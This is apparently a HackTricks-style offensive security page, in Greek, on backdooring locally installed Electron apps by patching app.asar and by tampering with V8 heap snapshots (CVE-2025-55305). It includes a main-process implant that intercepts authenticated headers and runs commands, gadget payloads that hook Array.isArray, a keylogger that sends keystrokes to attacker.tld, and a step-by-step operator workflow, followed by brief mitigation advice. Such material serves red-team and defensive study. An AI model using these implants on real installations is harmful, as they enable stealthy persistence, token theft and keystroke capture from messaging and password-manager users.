# Electron Local Code Injection and Snapshot Tampering

{{#include ../../banners/hacktricks-training.md}}

## Electron Local Code Injection

Αν μπορείς να τροποποιήσεις ή να κάνεις instrumentation σε μια τοπικά εγκατεστημένη εφαρμογή Electron, ίσως μπορέσεις να την κάνεις να εκτελέσει αυθαίρετο JavaScript. Δες:


{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

Για μια τοπική επιφάνεια debugging του Node inspector ή των Chromium DevTools, δες το [Node inspector/CEF debug abuse](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

## Post-exploitation: ASAR/main-process implants

Αν αποκτήσεις **πρόσβαση εγγραφής** σε έναν κατάλογο πόρων εφαρμογής Electron, μια πολύ πρακτική δυνατότητα post-exploitation είναι να κάνεις **patch το `app.asar`** (ή το JS entrypoint που φορτώνει) και να περιμένεις να επανεκκινήσει ο χρήστης την εφαρμογή. Σε αντίθεση με ένα XSS μόνο στον renderer, ο κώδικας που φορτώνεται από το **main process** εκτελείται στο **Node.js runtime** της εφαρμογής, οπότε συνήθως μπορεί να έχει πρόσβαση στο **filesystem**, να εκκινεί εντολές, να κάνει hook στα Electron APIs και να επιθεωρεί την κατάσταση της εφαρμογής μετά από authentication.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Τυπική ροή εργασίας:

1. Κάνε extract το `app.asar` και εντόπισε το πραγματικό bootstrap αρχείο από το `package.json` (`main`) ή από την υπάρχουσα λογική εκκίνησης.
2. Πρόσθεσε έναν μικρό loader στο **main process** (ή ένα hook σε preload/main-process) και κάνε repack το archive.
3. Περίμενε να εκκινηθεί ξανά η εφαρμογή και χρησιμοποίησε το implant για να καταγράψεις δεδομένα runtime αφού ο χρήστης ξεκλειδώσει ή κάνει authenticate στην desktop εφαρμογή.

Παράδειγμα ελάχιστου bootstrap patch:

```javascript
// Added near the application main entrypoint
const cp = require("child_process")
const { session } = require("electron")

session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
  // Inspect or copy authenticated headers/tokens here
  callback({ requestHeaders: details.requestHeaders })
})

cp.exec("id")
```

Πρακτικές επιπτώσεις:

- **Κλοπή δεδομένων από έμπιστο client**: μόλις η desktop app αποκρυπτογραφήσει ή φορτώσει δεδομένα για τον χρήστη, το implant μπορεί να τα διαβάσει από το runtime. Γι’ αυτό οι **E2EE messaging clients** (Signal/Slack/Mattermost) και οι **vault/secret managers** εξακολουθούν να αποτελούν ενδιαφέροντες στόχους στο επίπεδο του endpoint.
- **Κατάχρηση session/token**: τα Electron implants μπορούν να κλέψουν cookies της εφαρμογής, bearer tokens, request headers, αρχεία workspace ή credentials αποθετηρίων που είναι εκτεθειμένα στον client που εκτελείται (για παράδειγμα, από authenticated VS Code extensions ή Git integrations).
- **Μεταπήδηση μέσω του context του θύματος**: μια τροποποιημένη app μπορεί να προωθεί αιτήματα μέσω του workstation του θύματος, επαναχρησιμοποιώντας την IP του θύματος, το TLS fingerprint και το session της εφαρμογής, αντί να εξάγει μόνο raw tokens.

> [!NOTE]
> Αν ο στόχος έχει ενεργοποιήσει το **ASAR integrity** / **OnlyLoadAppFromAsar** ή hardened Electron **fuses**, ενδέχεται να χρειαστείτε διαφορετικό local code-loading primitive (για παράδειγμα, fuse abuse ή snapshot tampering). Δείτε τη σελίδα injection ειδικά για macOS για περισσότερες επιλογές local implant και λεπτομέρειες σχετικά με τα fuses.

## Local backdooring via V8 heap snapshot tampering (Electron/Chromium) – CVE-2025-55305

Οι εφαρμογές που βασίζονται σε Electron και Chromium κάνουν deserialize ένα προκατασκευασμένο V8 heap snapshot κατά την εκκίνηση (v8_context_snapshot.bin και, προαιρετικά, browser_v8_context_snapshot.bin), για να αρχικοποιήσουν κάθε V8 isolate (main, preload, renderer). Ιστορικά, τα integrity fuses του Electron δεν αντιμετώπιζαν αυτά τα snapshots ως εκτελέσιμο περιεχόμενο, οπότε διέφευγαν τόσο από την επιβολή ακεραιότητας μέσω fuse όσο και από τους ελέγχους code-signing του OS. Ως αποτέλεσμα, η αντικατάσταση του snapshot σε μια εγκατάσταση εγγράψιμη από τον χρήστη παρείχε stealthy, επίμονη εκτέλεση κώδικα μέσα στην app, χωρίς τροποποίηση των υπογεγραμμένων binaries ή του ASAR.<sup>[[2]](#references)</sup>

Βασικά σημεία
- Κενό ακεραιότητας: τα EnableEmbeddedAsarIntegrityValidation και OnlyLoadAppFromAsar επικυρώνουν το JavaScript της app μέσα στο ASAR, αλλά δεν κάλυπταν τα V8 heap snapshots (CVE-2025-55305). Αντίστοιχα, το Chromium δεν ελέγχει την ακεραιότητα των snapshots.<sup>[[3]](#references)[[4]](#references)</sup>
- Προϋποθέσεις επίθεσης: δυνατότητα εγγραφής τοπικού αρχείου στον κατάλογο εγκατάστασης της app. Αυτό είναι συνηθισμένο σε συστήματα όπου οι Electron apps ή οι browsers Chromium εγκαθίστανται σε διαδρομές εγγράψιμες από τον χρήστη (π.χ., %AppData%\Local στα Windows· /Applications με ορισμένους περιορισμούς στο macOS).
- Επίδραση: αξιόπιστη εκτέλεση JavaScript του attacker σε οποιοδήποτε isolate, μέσω αντικατάστασης ενός συχνά χρησιμοποιούμενου builtin (ενός «gadget»), με δυνατότητα persistence και παράκαμψης της επαλήθευσης code-signing.
- Επιφάνεια που επηρεάζεται: Electron apps (ακόμη και με ενεργοποιημένα fuses) και browsers βασισμένοι σε Chromium που φορτώνουν snapshots από τοποθεσίες εγγράψιμες από τον χρήστη.

Δημιουργία κακόβουλου snapshot χωρίς build του Chromium
- Χρησιμοποιήστε το προμεταγλωττισμένο electron/mksnapshot για να μεταγλωττίσετε ένα payload JS σε snapshot και να αντικαταστήσετε το v8_context_snapshot.bin της εφαρμογής.<sup>[[5]](#references)[[6]](#references)</sup>

Παράδειγμα ελάχιστου payload (επιβεβαίωση εκτέλεσης μέσω πρόκλησης crash)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
  // Executed whenever the app calls Array.isArray
  throw new Error("testing isArray gadget");
};
```

Δρομολόγηση payload με επίγνωση των isolate (εκτέλεση διαφορετικού κώδικα στο main έναντι του renderer)
- Ανίχνευση διεργασίας main: Globals αποκλειστικά του Node, όπως τα process.pid, process.binding() ή process.dlopen, υπάρχουν στο isolate της διεργασίας main.
- Ανίχνευση browser/renderer: Globals αποκλειστικά του browser, όπως το alert, είναι διαθέσιμα κατά την εκτέλεση σε context εγγράφου.

Παράδειγμα gadget που ελέγχει μία φορά τις δυνατότητες του Node στη διεργασία main
```js
const orig = Array.isArray;

Array.isArray = function() {
  // Defer until we land in main (has Node process)
  try {
    if (!process || !process.pid) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  // Run once
  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    console.log('[payload] isArray hook started ...');

    // Capability probing in main
    console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
    process.exit(0);
  }
  return orig(...arguments);
};
```

PoC κλοπής δεδομένων από renderer/browser context (π.χ., Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
  // Wait for a browser context
  try {
    if (!alert) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    setInterval(() => {
      window.onkeydown = (e) => {
        fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
      }
    }, 1000);
  }
  return orig(...arguments);
};
```

Ροή εργασίας χειριστή
1) Γράψτε το payload.js που αντικαθιστά ένα συνηθισμένο builtin (π.χ. Array.isArray) και, προαιρετικά, εκτελεί διαφορετικό κλάδο ανά isolate.
2) Δημιουργήστε το snapshot χωρίς πηγαίο κώδικα του Chromium:
   - npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Αντικαταστήστε τα αρχεία snapshot της εφαρμογής-στόχου:
   - v8_context_snapshot.bin (χρησιμοποιείται πάντα)
   - browser_v8_context_snapshot.bin (αν χρησιμοποιείται το fuse LoadBrowserProcessSpecificV8Snapshot)
4) Εκκινήστε την εφαρμογή· το gadget εκτελείται κάθε φορά που χρησιμοποιείται το επιλεγμένο builtin.

Σημειώσεις και παράγοντες προς εξέταση
- Παράκαμψη ελέγχων ακεραιότητας/υπογραφής: Τα αρχεία snapshot δεν αντιμετωπίζονται ως εγγενή εκτελέσιμα αρχεία από τους ελέγχους code-signing και, ιστορικά, δεν καλύπτονταν από τα fuses του Electron ή τους ελέγχους ακεραιότητας του Chromium.
- Επιμονή: Η αντικατάσταση του snapshot σε εγκατάσταση με εγγραφή από τον χρήστη συνήθως επιβιώνει από τις επανεκκινήσεις της εφαρμογής και μοιάζει με υπογεγραμμένη, νόμιμη εφαρμογή.
- Προγράμματα περιήγησης Chromium: Η ίδια ιδέα παραποίησης ισχύει για Chrome/παράγωγα που είναι εγκατεστημένα σε τοποθεσίες με εγγραφή από τον χρήστη. Το Chrome διαθέτει άλλους μετριασμούς ακεραιότητας, αλλά εξαιρεί ρητά τις τοπικές επιθέσεις με φυσική πρόσβαση από το μοντέλο απειλών του.<sup>[[9]](#references)[[10]](#references)</sup>

Εντοπισμός και μετριασμοί
- Αντιμετωπίστε τα snapshots ως εκτελέσιμο περιεχόμενο και συμπεριλάβετέ τα στην επιβολή ακεραιότητας (διόρθωση CVE-2025-55305).
- Προτιμήστε τοποθεσίες εγκατάστασης όπου μπορεί να γράψει μόνο ο διαχειριστής· ορίστε βασικές τιμές και παρακολουθείτε τα hash των v8_context_snapshot.bin και browser_v8_context_snapshot.bin.
- Εντοπίστε την αντικατάσταση builtin κατά την πρώιμη εκτέλεση και τις απροσδόκητες αλλαγές snapshot· ειδοποιήστε όταν τα snapshots που αποσειριοποιούνται δεν αντιστοιχούν στις αναμενόμενες τιμές.

## References

- [1] [JS-Tap v3: Μετεκμετάλλευση endpoint με εμφυτεύματα JavaScript](https://trustedsec.com/blog/js-tap-v3-endpoint-post-exploitation-with-javascript-implants)
- [2] [Παράκαμψη ελέγχων ακεραιότητας κώδικα για τοπική κερκόπορτα στα Signal, 1Password, Slack και άλλα](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [3] [Fuses του Electron](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [4] [Ακεραιότητα ASAR του Electron](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [5] [Προσαρμοσμένα startup snapshots του V8](https://v8.dev/blog/custom-startup-snapshots)
- [6] [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [7] [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [8] [Loki C2](https://github.com/boku7/Loki/)
- [9] [Chromium: Απενεργοποίηση φόρτωσης μη υπογεγραμμένου κώδικα (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [10] [Συχνές ερωτήσεις ασφαλείας του Chrome: οι τοπικές επιθέσεις με φυσική πρόσβαση είναι εκτός πεδίου](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model)
{{#include ../../banners/hacktricks-training.md}}
